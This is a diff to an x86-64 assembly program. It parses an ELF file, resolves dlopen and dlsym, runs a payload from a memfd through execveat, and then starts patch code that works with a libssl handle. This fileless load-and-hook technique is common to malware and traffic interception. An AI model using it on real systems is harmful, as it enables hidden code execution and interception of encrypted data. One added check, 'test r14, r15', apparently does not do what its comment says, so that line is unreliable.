@@ -164,21 +164,21 @@ _open_bin:
 _find_dynamic:
 
 ; we use these to compute offsets, only for this loop.
-    mov rax, rsp
-    add rax, [rsp + e_shoff_offset]
+    mov rax, [rsp + e_shoff_offset]
 _find_dynamic_loop:
     add rax, e_shentsize
-    mov ebx, [rax + sh_type_offset]
+    mov ebx, [rsp + rax + sh_type_offset]
     cmp ebx, SHT_DYNAMIC
     jne _find_dynamic_loop
 
-    mov rbx, [rax + dynamic_offset]
+; offset into a 5mb file, can't be that large.
+    mov ebx, [rsp + rax + dynamic_offset]
 
 
 ;; Finding offsets by reading .dynamic
 ;
 ; Register usage:
-; rbx - pointer into relocation table
+; rbx - offset into relocation table
 ; rsi - d_tag
 ; rdi - d_val
 ; rsp - buffer
@@ -210,8 +210,8 @@ _case_jmprel_test:
 
 _read_sht_dynamic_tail:
     add rbx, 16
-    cmp rsi, DT_NULL
-    jne  _read_sht_dynamic
+    test rsi, rsi
+    jnz  _read_sht_dynamic
 
 
 ; now lets finally resolve dlopen and dlsym
@@ -249,19 +249,19 @@ _case_dlsy:
     mov r15d, esi
 
 _process_relocs_loop_tail:
-    cmp r15, 0
-    je  _process_relocs
+; checking if either are 0.
+    test r15, r15
+    jz  _process_relocs
 
-    cmp r14, 0
-    je  _process_relocs
+    test r14, r15
+    jz  _process_relocs
 
 _discover_main:
     mov rax, [rsp + e_entry_offset]
     mov rbx, rax
-    add rax, rsp
     add rax, main_offset
 
-    movsxd rax, [rax]
+    movsxd rax, [rsp + rax]
     add rax, main_rip_offset
     add rbx, rax
 
@@ -300,13 +300,16 @@ _write_memfd:
     syscall
 
 _execve_memfd:
-    mov r8, AT_EMPTY_PATH
+    mov r8d, AT_EMPTY_PATH
     xor r10, r10
     xor edx, edx
     lea rsi, [rel _str_memfd_name]
     mov rdi, r12
     mov eax, SYS_execveat
     syscall
+
+; we can move probably 2 or more instructions into the fake values we are using
+; for dlopen and dlsym
 
 ; we will now be in the patch after the execveat(), so lets move onto that!
 
@@ -316,6 +319,7 @@ _execve_memfd:
 ; r14 - libssl handle
 ; r15 - sbio / scratch
 
+; we want to remove this, need to adjust our offset calculations earlier.
 _patch_start:
     jmp _patch_code
 
